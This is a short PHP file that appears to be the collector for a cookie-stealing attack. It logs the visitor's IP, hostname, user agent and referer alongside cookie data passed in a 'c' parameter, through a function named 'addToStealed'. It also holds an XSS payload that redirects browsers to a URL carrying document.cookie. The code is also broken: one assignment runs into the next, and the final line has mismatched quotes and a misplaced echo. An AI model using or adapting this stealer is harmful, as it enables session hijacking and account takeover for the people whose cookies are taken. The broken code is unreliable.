<?PHP
// Protection against unauthorized access
if (!defined('GimmeCookie')) {
    header('Location: ./');
    die;
}

$ip     = $_SERVER['REMOTE_ADDR'];
$host   = gethostbyaddr($ip);
$navigator  = $_SERVER['HTTP_USER_AGENT'];
$date   = date("d/m/Y");
$time   = date("H:i:s");
$referer  = (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
$path   =
$log    = "cp.php";

if(isset($_GET['c'])) 
  $data = $_GET['c'];
else 
  $data = 'Empty data';

addToStealed($log, $ip, $host, $navigator, $date, $time, $referer, $data);

$content = '<script>location.href='/main.php?c='+escape(document.cookie)</script> '.echo "Unauthorized Access".'';